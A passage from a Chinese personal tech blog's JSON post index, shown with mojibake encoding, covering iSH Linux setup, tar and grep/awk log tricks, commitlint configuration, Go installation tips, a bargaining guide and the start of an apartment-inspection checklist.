æ¸©é¦¨æç¤ºï¼šåœ¨iShçš„å³ä¸‹è§’ï¼Œæœ‰ä¸ªæŒ‰é’®æ˜¯ç²˜è´´æŒ‰é’®ã€‚\nstep3: apk update è™½ç„¶å®‰è£…äº†apk, ä½†æ˜¯ä¸æ›´æ–°çš„è¯ï¼Œå¯èƒ½å¾ˆå¤šå®‰è£…åŒ…éƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æœ€å¥½å…ˆæ›´æ–°ã€‚\nåœ¨æ›´æ–°ä¹‹å‰ã€‚æœ€å¥½æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ŒæŠŠapkçš„æºæ¢æˆæ¸…åçš„ï¼Œè¿™æ ·ä¹‹åçš„å®‰è£…è½¯ä»¶ä¼šæ¯”è¾ƒå¿«ç‚¹ã€‚\nsed -i \u0026#39;s/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g\u0026#39; /etc/apk/repositories apk update step4: å®‰è£…å„ç§å¼€å‘å·¥å…· git zsh tmux vim\u0026hellip; apk add git zsh tmux vim step5: å®‰è£…oh-my-zsh è¿™æ˜¯å¿…ä¸å¯å°‘çš„ç¥å™¨ å› ä¸ºä»githubä¸Šå…‹éš†oh-my-zshå¯èƒ½ä¼šå¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘ç”¨äº†ç äº‘ä¸Šçš„ä¸€ä¸ªä»“åº“ã€‚ è¿™æ ·é€Ÿåº¦å°±ä¼šå¾ˆå¿«äº†ã€‚\ngit clone https://gitee.com/nuannuande/oh-my-zsh.git ~/.oh-my-zsh cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc chsh -s $(which zsh) step6: å®‰è£…nodejs python golangç­‰ã€‚ apk add nodejs python3 ä¸‹é¢çœ‹åˆ°è¾“å‡ºäº†nodejså’Œpythonçš„ç‰ˆæœ¬ï¼Œè¯´æ˜å®‰è£…æˆåŠŸã€‚å¦å¤–ishæ”¯æŒæ¢è‚¤çš„ã€‚ä¹‹å‰çš„ç™½è‰²çš„ï¼Œä¸‹é¢çš„æ˜¯é»‘è‰²çš„ã€‚","title":"åœ¨iPhone iPadä¸Šæ­å»ºLinuxæœ¬åœ°å¼€å‘ç¯å¢ƒ"},{"content":"ç¯å¢ƒmac\n# è¿™ä¸ªç›®å½•æ‰“åŒ…ä¹‹åï¼Œå†…éƒ¨çš„é¡¶å±‚ç›®å½•æ˜¯dist, è§£å‹ä¹‹åï¼Œæœ‰å¯èƒ½è¦†ç›–åˆ°ä»¥å‰çš„dist tar -zcvf demo.tar.gz dist/ # ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œé¡¶å±‚ç›®å½•å°†ä¼šè¢«ä¿®æ”¹æˆdemo-0210 tar -s /^dist/demo-0210/ -zcvf demo.tar.gz dist/ ","permalink":"https://wdd.js.org/posts/2020/10/sxuez4/","summary":"ç¯å¢ƒmac\n# è¿™ä¸ªç›®å½•æ‰“åŒ…ä¹‹åï¼Œå†…éƒ¨çš„é¡¶å±‚ç›®å½•æ˜¯dist, è§£å‹ä¹‹åï¼Œæœ‰å¯èƒ½è¦†ç›–åˆ°ä»¥å‰çš„dist tar -zcvf demo.tar.gz dist/ # ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œé¡¶å±‚ç›®å½•å°†ä¼šè¢«ä¿®æ”¹æˆdemo-0210 tar -s /^dist/demo-0210/ -zcvf demo.tar.gz dist/ ","title":"taræ‰“åŒ…å°æŠ€å·§: æ›¿æ¢æ ¹ç›®å½•"},{"content":"åªè¦æœ‰ä»·æ ¼ï¼Œå°±å¯ä»¥è®²ä»· ****åªè¦æœ‰ä»·æ ¼ï¼Œå°±å¯ä»¥è®²ä»·ã€‚**ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œä¾‹å¦‚è¶…å¸‚ï¼Œè¶…å¸‚çš„ä¸œè¥¿æ˜ç æ ‡ä»·ã€‚å”®è´§å‘˜ä¸€èˆ¬ä¸ä¼šç®¡ä»·æ ¼ã€‚\nå…¶æ¬¡ï¼Œè¦å’Œèƒ½ç®¡ä»·çš„äººè°ˆ **å…¶æ¬¡ï¼Œè¦å’Œèƒ½ç®¡ä»·çš„äººè°ˆã€‚ æœ‰äº›äººä¸ç®¡ä»·æ ¼ï¼Œè®²å¤šå°‘éƒ½æ²¡ç”¨ã€‚\n50%ç†è®º ç¬¬ä¸€æ¬¡å–Šä»·ä»¥åï¼Œä¸€èˆ¬åªä¼šæŠ¬ä»·ï¼Œè€Œä¸ä¼šé™ä»·ï¼Œæ‰€ä»¥åŠ¡å¿…è¦é‡è§†ã€‚\nä¾‹å¦‚ä¸€æŸèŠ±ï¼Œåº—å®¶è¦ä»·80ï¼Œå®é™…è¿™æŸèŠ±æˆæœ¬20ã€‚å¦‚æœä½ ç¬¬ä¸€å–Šä»·70ï¼Œé‚£ä½ åªèƒ½ä¼˜æƒ å°äº10å…ƒã€‚\nç¬¬ä¸€æ¬¡å–Šä»·è¦ä½äºå¿ƒç†ä»·ä½ï¼Œè¿™æ ·æ‰æœ‰ç•™å¤Ÿä¸Šæ¶¨çš„ç©ºé—´ **50%ç†è®º ï¼Œ**ä¸€èˆ¬ä½ çš„ç¬¬ä¸€æ¬¡å‡ºä»·å¯ä»¥æŒ‰ç…§å–å®¶è¦ä»·çš„50%å¼€å§‹å–Šä»·ã€‚ç„¶åå†åˆ©ç”¨å„ç§è®¡ç­–ã€‚æé«˜ä»·æ ¼ï¼Œè¿™é‡Œæœ€é‡è¦çš„æ˜¯æ‘¸å‡ºä¹°å®¶çš„åº•ä»·ï¼Œé«˜äºè¿™ä¸ªä½ä»·ï¼Œä¹°å®¶æ‰ä¼šå–ã€‚80å…ƒçš„èŠ±ï¼Œä½ çš„ç¬¬ä¸€æ¬¡å‡ºä»·å¯ä»¥å–Š40å…ƒã€‚ è„¸çš®è¦åšï¼Œè„¸çš®åšï¼Œæ‰èƒ½è¦æ›´å¤šä¼˜æƒ  ","permalink":"https://wdd.js.org/posts/2020/10/ahtqix/","summary":"åªè¦æœ‰ä»·æ ¼ï¼Œå°±å¯ä»¥è®²ä»· ****åªè¦æœ‰ä»·æ ¼ï¼Œå°±å¯ä»¥è®²ä»·ã€‚**ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œä¾‹å¦‚è¶…å¸‚ï¼Œè¶…å¸‚çš„ä¸œè¥¿æ˜ç æ ‡ä»·ã€‚å”®è´§å‘˜ä¸€èˆ¬ä¸ä¼šç®¡ä»·æ ¼ã€‚\nå…¶æ¬¡ï¼Œè¦å’Œèƒ½ç®¡ä»·çš„äººè°ˆ **å…¶æ¬¡ï¼Œè¦å’Œèƒ½ç®¡ä»·çš„äººè°ˆã€‚ æœ‰äº›äººä¸ç®¡ä»·æ ¼ï¼Œè®²å¤šå°‘éƒ½æ²¡ç”¨ã€‚\n50%ç†è®º ç¬¬ä¸€æ¬¡å–Šä»·ä»¥åï¼Œä¸€èˆ¬åªä¼šæŠ¬ä»·ï¼Œè€Œä¸ä¼šé™ä»·ï¼Œæ‰€ä»¥åŠ¡å¿…è¦é‡è§†ã€‚\nä¾‹å¦‚ä¸€æŸèŠ±ï¼Œåº—å®¶è¦ä»·80ï¼Œå®é™…è¿™æŸèŠ±æˆæœ¬20ã€‚å¦‚æœä½ ç¬¬ä¸€å–Šä»·70ï¼Œé‚£ä½ åªèƒ½ä¼˜æƒ å°äº10å…ƒã€‚\nç¬¬ä¸€æ¬¡å–Šä»·è¦ä½äºå¿ƒç†ä»·ä½ï¼Œè¿™æ ·æ‰æœ‰ç•™å¤Ÿä¸Šæ¶¨çš„ç©ºé—´ **50%ç†è®º ï¼Œ**ä¸€èˆ¬ä½ çš„ç¬¬ä¸€æ¬¡å‡ºä»·å¯ä»¥æŒ‰ç…§å–å®¶è¦ä»·çš„50%å¼€å§‹å–Šä»·ã€‚ç„¶åå†åˆ©ç”¨å„ç§è®¡ç­–ã€‚æé«˜ä»·æ ¼ï¼Œè¿™é‡Œæœ€é‡è¦çš„æ˜¯æ‘¸å‡ºä¹°å®¶çš„åº•ä»·ï¼Œé«˜äºè¿™ä¸ªä½ä»·ï¼Œä¹°å®¶æ‰ä¼šå–ã€‚80å…ƒçš„èŠ±ï¼Œä½ çš„ç¬¬ä¸€æ¬¡å‡ºä»·å¯ä»¥å–Š40å…ƒã€‚ è„¸çš®è¦åšï¼Œè„¸çš®åšï¼Œæ‰èƒ½è¦æ›´å¤šä¼˜æƒ  ","title":"è®²ä»·çš„å­¦é—®"},{"content":"é¢„å¤„ç† ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¿‡æ»¤ grep key fileÂ âœ grep ERROR a.log 12:12 ERROR:core bad message ä»å¤šä¸ªæ–‡ä»¶ä¸­è¿‡æ»¤ grep key file1 fil2Â å¤šæ–‡ä»¶æœç´¢ï¼ŒæŒ‡å®šå¤šä¸ªæ–‡ä»¶ grep key *.logÂ ä½¿ç”¨æ­£åˆ™çš„æ–¹å¼ï¼ŒåŒ¹é…å¤šä¸ªæ–‡ä»¶ grep -h key *.logÂ å¯ä»¥ä½¿ç”¨-h, è®©ç»“æœä¸­ä¸å‡ºç°æ–‡ä»¶åã€‚é»˜è®¤æ–‡ä»¶åä¼šå‡ºç°åœ¨åŒ¹é…è¡Œçš„å‰é¢ã€‚ âœ grep ERROR a.log b.log a.log:12:12 ERROR:core bad message b.log:13:12 ERROR:core bad message âœ grep ERROR *.log a.log:12:12 ERROR:core bad message b.log:13:12 ERROR:core bad message å¤šä¸ªå…³é”®è¯è¿‡æ»¤ grep -e key1 -e key2 fileÂ ä½¿ç”¨-eå‚æ•°ï¼Œå¯ä»¥åˆ¶å®šå¤šä¸ªå…³é”®è¯ âœ grep -e ERROR -e INFO a.log 12:12 ERROR:core bad message 12:12 INFO:parse bad message1 æ­£åˆ™è¿‡æ»¤ grep -E REG fileÂ ä¸‹é¢ä¾‹å­æ˜¯åŒ¹é…db:åè·Ÿæ•°å­—éƒ¨åˆ† âœ grep -E \u0026#34;db:\\d+ \u0026#34; a.log 12:14 WARNING:db:1 bad message 12:14 WARNING:db:21 bad message 12:14 WARNING:db:2 bad message1 12:14 WARNING:db:4 bad message ä»…è¾“å‡ºåŒ¹é…å­—æ®µ grep -o argsÂ ä½¿ç”¨-oå‚æ•°ï¼Œå¯ä»¥ä»…ä»…è¾“å‡ºåŒ¹é…é¡¹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªåŒ¹é…çš„è¡Œ âœ go-tour grep -o -E \u0026#34;db:\\d+ \u0026#34; a.log db:1 db:21 db:2 db:4 ç»Ÿè®¡å…³é”®è¯å‡ºç°çš„è¡Œæ•° ä¾‹å¦‚ä¸€ä¸ªnginxçš„access.log, æˆ‘ä»¬æƒ³ç»Ÿè®¡å…¶ä¸­çš„POSTçš„ä¸ªæ•°ï¼Œå’ŒOPTIONSçš„ä¸ªæ•°ã€‚\nå…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼Œåä¸ºmethod.ack\nBEGIN{ post_lines = 0 options_lines = 0 printf \u0026#34;start\\n\u0026#34; } /POST/ { post_lines++ } /OPTIONS/ { options_lines++ } END { printf \u0026#34;post_lines: %s, \\noptions_lines: %s \\n\u0026#34;,post_lines,options_lines } ç„¶åæ‰§è¡Œ\nack -f method.ack access.log æ—¶é—´å¤„ç† æ¯”å¦‚ç»™ä½ ä¸€ä¸ªnginxçš„access.log, è®©ä½ æŒ‰ç…§æ¯ç§’ï¼Œæ¯åˆ†é’Ÿç»Ÿè®¡ä¸‹è¯·æ±‚é‡çš„å¤§å°ï¼Œå¦‚ä½•åšå‘¢ï¼Ÿ\né¦–å…ˆå–å‡ºæ—¥å¿—è¡Œä¸­çš„æ—¶é—´ï¼Œç„¶åä»äº‹ä»¶ä¸­å–å‡ºç§’ awk '{print $4}'Â 10.32.104.47 - - [29/Sep/2020:06:43:53 +0800] \u0026#34;OPTIONS url HTTP/1.1\u0026#34; 200 0 \u0026#34;\u0026#34; \u0026#34;Mozi Safari/537.36\u0026#34; \u0026#34;-\u0026#34; awk \u0026#39;{print $4}\u0026#39; access.log [29/Sep/2020:05:15:27 [29/Sep/2020:05:15:27 [29/Sep/2020:05:15:27 [29/Sep/2020:05:15:27 [29/Sep/2020:05:15:27 [29/Sep/2020:05:15:27 é‚£å¦‚ä½•å–å‡ºåˆ†é’Ÿå‘¢ï¼Ÿä½¿ç”¨ackçš„å­—ç¬¦ä¸²å‡½æ•°ï¼Œ substr(str, startIndex, len)Â awk \u0026#39;{print substr($4,0,18)}\u0026#39; access.log [29/Sep/2020:05:23 [29/Sep/2020:05:23 å¯¹è¾“å‡ºç»“æœè¿›è¡Œ uniq -cÂ ç»Ÿè®¡å‡ºç°é‡å¤è¡Œçš„æ¬¡æ•°ã€‚å³å•ä½äº‹ä»¶å†…æ—¶é—´é‡å¤çš„æ¬¡æ•°ï¼Œä¹Ÿå°±æ˜¯å•ä½äº‹ä»¶å†…çš„è¯·æ±‚æ•°ã€‚\n625 [29/Sep/2020:06:36 625 [29/Sep/2020:06:37 624 [29/Sep/2020:06:38 624 [29/Sep/2020:06:39 651 [29/Sep/2020:06:40 626 [29/Sep/2020:06:41 624 [29/Sep/2020:06:42 560 [29/Sep/2020:06:43 æ’åºä¸å»é‡ sort æŒ‰ç…§æŸä¸€åˆ—å»é‡ æŒ‰ç…§å¤šåˆ—å»é‡ vimä¸“é¡¹ç»ƒä¹  :set nowrapÂ å–æ¶ˆè‡ªåŠ¨æ¢è¡Œ :set nuÂ æ˜¾ç¤ºè¡Œå· :%!awk '{$2=\u0026quot;\u0026quot;;print $0}'Â åˆ é™¤æŒ‡å®šçš„åˆ— :%!awk '{print $3,$4}'Â æŒ‘é€‰æŒ‡å®šçš„åˆ— :g/key/dÂ åˆ é™¤åŒ¹é…çš„è¡Œ :v/key/dÂ åˆ é™¤ä¸åŒ¹é…çš„è¡Œ :g/key/pÂ ä»…ä»…æ˜¾ç¤ºåŒ¹é…çš„è¡Œ :v/key/pÂ ä»…ä»…æ˜¾ç¤ºä¸åŒ¹é…çš„è¡Œ /key1\\|key2Â æŸ¥æ‰¾å¤šä¸ªå…³é”®è¯ :nohlÂ ç§»é™¤é«˜äº® æ ¸æ­¦å™¨ lnav è¿‡æ»¤ ç»Ÿè®¡å›¾ select cs_method , count( cs_method ) FROM access_log group by cs_method ","permalink":"https://wdd.js.org/posts/2020/04/qlqhiv/","summary":"é¢„å¤„ç† ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¿‡æ»¤ grep key fileÂ âœ grep ERROR a.log 12:12 ERROR:core bad message ä»å¤šä¸ªæ–‡ä»¶ä¸­è¿‡æ»¤ grep key file1 fil2Â å¤šæ–‡ä»¶æœç´¢ï¼ŒæŒ‡å®šå¤šä¸ªæ–‡ä»¶ grep key *.logÂ ä½¿ç”¨æ­£åˆ™çš„æ–¹å¼ï¼ŒåŒ¹é…å¤šä¸ªæ–‡ä»¶ grep -h key *.logÂ å¯ä»¥ä½¿ç”¨-h, è®©ç»“æœä¸­ä¸å‡ºç°æ–‡ä»¶åã€‚é»˜è®¤æ–‡ä»¶åä¼šå‡ºç°åœ¨åŒ¹é…è¡Œçš„å‰é¢ã€‚ âœ grep ERROR a.log b.log a.log:12:12 ERROR:core bad message b.log:13:12 ERROR:core bad message âœ grep ERROR *.log a.log:12:12 ERROR:core bad message b.log:13:12 ERROR:core bad message å¤šä¸ªå…³é”®è¯è¿‡æ»¤ grep -e key1 -e key2 fileÂ ä½¿ç”¨-eå‚æ•°ï¼Œå¯ä»¥åˆ¶å®šå¤šä¸ªå…³é”®è¯ âœ grep -e ERROR -e INFO a.log 12:12 ERROR:core bad message 12:12 INFO:parse bad message1 æ­£åˆ™è¿‡æ»¤ grep -E REG fileÂ ä¸‹é¢ä¾‹å­æ˜¯åŒ¹é…db:åè·Ÿæ•°å­—éƒ¨åˆ† âœ grep -E \u0026#34;db:\\d+ \u0026#34; a.","title":"[todo]é”‹åˆ©çš„linuxæ—¥å¿—åˆ†æå‘½ä»¤"},{"content":"è™½ç„¶flashå·²ç»å‡ ä¹è¢«æ·˜æ±°äº†ï¼Œä½†æ˜¯åœ¨æŸäº›è€ç‰ˆæœ¬çš„IEé‡Œé¢ï¼Œä¾ç„¶æœ‰ä»–ä»¬é¡½å¼ºçš„èº«å½±ã€‚\nä½¿ç”¨flash æ¨¡æ‹Ÿwebsocket, æœ‰æ—¶ä¼šé‡åˆ°ä¸‹é¢çš„é—®é¢˜ã€‚è™½ç„¶flashå®‰å…¨ç­–ç•¥æ–‡ä»¶å·²ç»éƒ¨ç½²ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¾ç„¶æŠ¥é”™ã€‚\n[WebSocket] cannot connect to Web Socket Server at \u0026hellip; make sure the server is runing and Flash policy file is correct placed.\nè§£å†³æ–¹æ¡ˆï¼š\nåœ¨**%WINDIR%\\System32\\Macromed\\Flash**ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºmms.cfgçš„æ–‡ä»¶, å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¸ç”¨åˆ›å»ºã€‚\næ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nDisableSockets=0 flash_player_admin_guide.pdf\n","permalink":"https://wdd.js.org/posts/2020/09/thg9yu/","summary":"è™½ç„¶flashå·²ç»å‡ ä¹è¢«æ·˜æ±°äº†ï¼Œä½†æ˜¯åœ¨æŸäº›è€ç‰ˆæœ¬çš„IEé‡Œé¢ï¼Œä¾ç„¶æœ‰ä»–ä»¬é¡½å¼ºçš„èº«å½±ã€‚\nä½¿ç”¨flash æ¨¡æ‹Ÿwebsocket, æœ‰æ—¶ä¼šé‡åˆ°ä¸‹é¢çš„é—®é¢˜ã€‚è™½ç„¶flashå®‰å…¨ç­–ç•¥æ–‡ä»¶å·²ç»éƒ¨ç½²ï¼Œä½†æ˜¯å®¢æˆ·ç«¯ä¾ç„¶æŠ¥é”™ã€‚\n[WebSocket] cannot connect to Web Socket Server at \u0026hellip; make sure the server is runing and Flash policy file is correct placed.\nè§£å†³æ–¹æ¡ˆï¼š\nåœ¨**%WINDIR%\\System32\\Macromed\\Flash**ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºmms.cfgçš„æ–‡ä»¶, å¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¸ç”¨åˆ›å»ºã€‚\næ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\nDisableSockets=0 flash_player_admin_guide.pdf","title":"flash_player_admin_guide"},{"content":"å»ºè®®å…ˆçœ‹ä¸‹å‰æçŸ¥è¯†ï¼šhttps://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html\næäº¤ä¿¡æ¯è§„èŒƒ é€šç”¨ç±»å‹çš„å¤´å­—æ®µ\nbuild æ„å»º ci æŒç»­ç»§æ‰¿å·¥å…· chore æ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ docs æ–‡æ¡£ï¼ˆdocumentationï¼‰ feat æ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fix ä¿®è¡¥bug perf æ€§èƒ½ä¼˜åŒ– refactor é‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ revert style æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ test å¢åŠ æµ‹è¯• git commit -m \u0026#34;fix: xxxxxx\u0026#34; git commit -m \u0026#34;feat: xxxxxx\u0026#34; å®‰è£… å®‰è£…ä¾èµ– yarn add -D @commitlint/config-conventional @commitlint/cli husky ä¿®æ”¹package.json åœ¨package.jsonä¸­åŠ å…¥\n\u0026#34;husky\u0026#34;: { \u0026#34;hooks\u0026#34;: { \u0026#34;commit-msg\u0026#34;: \u0026#34;commitlint -E HUSKY_GIT_PARAMS\u0026#34; } } æ–°å¢é…ç½® æ–‡ä»¶åï¼šcommitlint.config.js\nmodule.exports = {extends: [\u0026#39;@commitlint/config-conventional\u0026#39;]} æµ‹è¯• å¦‚æœä½ çš„æäº¤ä¸ç¬¦åˆè§„èŒƒï¼Œæäº¤å°†ä¼šå¤±è´¥ã€‚\nâœ git commit -am \u0026#34;00\u0026#34; warning ../package.json: No license field husky \u0026gt; commit-msg (node v12.18.3) â§— input: 00 âœ– subject may not be empty [subject-empty] âœ– type may not be empty [type-empty] âœ– found 2 problems, 0 warnings â“˜ Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint æ ¹æ®commitlogç”Ÿæˆchangelog ä¸‹é¢å‘½ä»¤ä¸­çš„1.5.5 1.5.10å¯ä»¥æ˜¯ä¸¤ä¸ªtag, ä¹Ÿå¯ä»¥æ˜¯ä¸¤ä¸ªåˆ†æ”¯ã€‚\ngit log å¯ä»¥æå–ä¸¤ä¸ªç‚¹ä¹‹é—´çš„commitlog, ä½¿ç”¨\u0026hellip;\ngit log --pretty=format:\u0026#34;[%h] %s (%an)\u0026#34; 1.5.5...1.5.10 | sort -k2,2 \u0026gt; changelog.md å‚è€ƒ https://github.com/conventional-changelog/commitlint/tree/master/@commitlint/config-angular https://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html ","permalink":"https://wdd.js.org/posts/2020/09/vu0ag0/","summary":"å»ºè®®å…ˆçœ‹ä¸‹å‰æçŸ¥è¯†ï¼šhttps://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html\næäº¤ä¿¡æ¯è§„èŒƒ é€šç”¨ç±»å‹çš„å¤´å­—æ®µ\nbuild æ„å»º ci æŒç»­ç»§æ‰¿å·¥å…· chore æ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ docs æ–‡æ¡£ï¼ˆdocumentationï¼‰ feat æ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fix ä¿®è¡¥bug perf æ€§èƒ½ä¼˜åŒ– refactor é‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ revert style æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ test å¢åŠ æµ‹è¯• git commit -m \u0026#34;fix: xxxxxx\u0026#34; git commit -m \u0026#34;feat: xxxxxx\u0026#34; å®‰è£… å®‰è£…ä¾èµ– yarn add -D @commitlint/config-conventional @commitlint/cli husky ä¿®æ”¹package.json åœ¨package.jsonä¸­åŠ å…¥\n\u0026#34;husky\u0026#34;: { \u0026#34;hooks\u0026#34;: { \u0026#34;commit-msg\u0026#34;: \u0026#34;commitlint -E HUSKY_GIT_PARAMS\u0026#34; } } æ–°å¢é…ç½® æ–‡ä»¶åï¼šcommitlint.config.js\nmodule.exports = {extends: [\u0026#39;@commitlint/config-conventional\u0026#39;]} æµ‹è¯• å¦‚æœä½ çš„æäº¤ä¸ç¬¦åˆè§„èŒƒï¼Œæäº¤å°†ä¼šå¤±è´¥ã€‚\nâœ git commit -am \u0026#34;00\u0026#34; warning ../package.json: No license field husky \u0026gt; commit-msg (node v12.","title":"ä½¿ç”¨commitlintæ£€æŸ¥gitæäº¤ä¿¡æ¯æ˜¯å¦åˆè§„"},{"content":"1. å¦‚ä½•å®‰è£…go æœ¬æ¬¡å®‰è£…ç¯å¢ƒæ˜¯win10å­ç³»ç»Ÿ ubuntu 20.04\næ‰“å¼€ç½‘ç«™ https://golang.google.cn/dl/\né€‰æ‹©åˆé€‚çš„æœ€æ–°ç‰ˆçš„è¿æ¥\ncd mkdir download cd download wget https://golang.google.cn/dl/go1.16.3.linux-amd64.tar.gz tar -C /usr/local -xvf go1.16.3.linux-amd64.tar.gz å› ä¸ºæˆ‘ç”¨çš„æ˜¯zsh æ‰€ä»¥æˆ‘åœ¨~/.zshrcä¸­ï¼Œå°†goçš„binç›®å½•åŠ å…¥åˆ°PATHä¸­ export PATH=$PATH:/usr/local/go/bin ä¿å­˜.zshrcä¹‹å source ~/.zshrc âœ download go version go version go1.16.3 linux/amd64 2. go proxyè®¾ç½® Go 1.13 åŠä»¥ä¸Šï¼ˆæ¨èï¼‰\næ‰“å¼€ä½ çš„ç»ˆç«¯å¹¶æ‰§è¡Œ\ngo env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.cn,direct 3. go get ä¸‹è½½çš„æ–‡ä»¶åœ¨å“ªï¼Ÿ æ£€æŸ¥ go env\nGOPATH=\u0026#34;/Users/wangdd/goâ€ /Users/wangdd/go/pkg/mod total 0 drwxr-xr-x 4 wangdd staff 128B Sep 14 09:17 cache drwxr-xr-x 8 wangdd staff 256B Sep 14 09:17 github.com drwxr-xr-x 3 wangdd staff 96B Sep 14 09:17 golang.org è·¯å¾„åœ¨GOPATH/pkg/mod ç›®å½•ä¸‹\n4. cannot find module providing package github.com åœ¨é¡¹ç›®æ ¹ç›®å½•æ‰§è¡Œ\ngo mod init module_name 5. é€‰æ‹©ä»€ä¹ˆWebæ¡†æ¶ fiber å¦‚æœä½ è¦å†™ä¸€ä¸ªwebæœåŠ¡å™¨ï¼Œæœ€å¿«é€Ÿçš„æ–¹å¼æ˜¯æŒ‘é€‰ä¸€ä¸ªç†Ÿæ‚‰çš„æ¡†æ¶ã€‚ å¦‚æœä½ ç†Ÿæ‚‰Node.jsä¸­çš„expressæ¡†æ¶ï¼Œé‚£ä½ ä¼šéå¸¸å¿«é€Ÿçš„ä¸Šæ‰‹fiberï¼Œå› ä¸ºfiberå°±æ˜¯å‚è€ƒexpressåšçš„ã€‚\nhttps://github.com/gofiber/fiber\n6. è‡ªåŠ¨æ„å»º air npmä¸­æœ‰ä¸ªåŒ…ï¼Œå«åšnodemonï¼Œå®ƒä¼šåœ¨ä»£ç å˜æ›´ä¹‹åï¼Œé‡å¯æœåŠ¡å™¨ã€‚\nå¦‚æœä½ éœ€è¦åœ¨golangä¸­ç±»ä¼¼çš„åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨https://github.com/cosmtrek/air\n7. å¦‚ä½•æŸ¥çœ‹å®˜æ–¹åº“æ–‡æ¡£ go doc fmt | less ","permalink":"https://wdd.js.org/golang/golang-start-faq/","summary":"1. å¦‚ä½•å®‰è£…go æœ¬æ¬¡å®‰è£…ç¯å¢ƒæ˜¯win10å­ç³»ç»Ÿ ubuntu 20.04\næ‰“å¼€ç½‘ç«™ https://golang.google.cn/dl/\né€‰æ‹©åˆé€‚çš„æœ€æ–°ç‰ˆçš„è¿æ¥\ncd mkdir download cd download wget https://golang.google.cn/dl/go1.16.3.linux-amd64.tar.gz tar -C /usr/local -xvf go1.16.3.linux-amd64.tar.gz å› ä¸ºæˆ‘ç”¨çš„æ˜¯zsh æ‰€ä»¥æˆ‘åœ¨~/.zshrcä¸­ï¼Œå°†goçš„binç›®å½•åŠ å…¥åˆ°PATHä¸­ export PATH=$PATH:/usr/local/go/bin ä¿å­˜.zshrcä¹‹å source ~/.zshrc âœ download go version go version go1.16.3 linux/amd64 2. go proxyè®¾ç½® Go 1.13 åŠä»¥ä¸Šï¼ˆæ¨èï¼‰\næ‰“å¼€ä½ çš„ç»ˆç«¯å¹¶æ‰§è¡Œ\ngo env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.cn,direct 3. go get ä¸‹è½½çš„æ–‡ä»¶åœ¨å“ªï¼Ÿ æ£€æŸ¥ go env\nGOPATH=\u0026#34;/Users/wangdd/goâ€ /Users/wangdd/go/pkg/mod total 0 drwxr-xr-x 4 wangdd staff 128B Sep 14 09:17 cache drwxr-xr-x 8 wangdd staff 256B Sep 14 09:17 github.","title":"Golangåˆå­¦è€…çš„é—®é¢˜"},{"content":"åœ¨ä¸Šæµ·å·¥ä½œçš„äººï¼Œé™¤äº†ä¸€å¹´ä¸€æ¬¡çš„æ˜¥è¿ï¼Œå°±å¯èƒ½æ˜¯å°±æ˜¯ä¸€å¹´ä¸€æ¬¡çš„æ‰¾æˆ¿æ¬å®¶äº†ã€‚\næ‰¾æˆ¿å½·ä½›å°±æ˜¯ä¸€è¶Ÿè¥¿å¤©å–ç»ï¼Œè¦ç»å†ä¹ä¹å…«åä¸€éš¾ï¼Œä¹Ÿè¦ä¸ªå„ç§å¦–é­”é¬¼æ€ªæ–—æ™ºæ–—å‹‡ã€‚è¿™å…¶ä¸­éš¾å¤„ï¼Œæš‚ä¸”ä¸è¡¨ã€‚é‡ç‚¹ä»‹ç»ä½ åº”å½“å¦‚ä½•å»æŒ‰ç…§ä¸€å®šçš„æ–¹æ¡ˆæ¥æ£€æŸ¥å„ç§è®¾æ–½çš„åŠŸèƒ½ã€‚\nè¦çŸ¥é“ï¼Œä¸–äº‹å¤šå˜ï¼Œä½ ç°ä¸‹æ‰¾çš„æˆ¿å­å¦‚æœå¾ˆä¸é”™ï¼Œå³ä½¿åæœŸçªç„¶éœ€è¦è½¬ç§Ÿï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå®¹æ˜“è½¬ç§Ÿçš„ã€‚å¦åˆ™æˆ¿å­è½¬ç§Ÿä¸å‡ºå»ï¼Œè‡ªå·±ä¹Ÿç™½ç™½èµ”äº†æŠ¼é‡‘ã€‚\né‡ç‚¹æ£€æŸ¥\næ´—è¡£æœº ç©ºè°ƒ å†°ç®± æŠ½æ²¹çƒŸæœº é©¬æ¡¶ 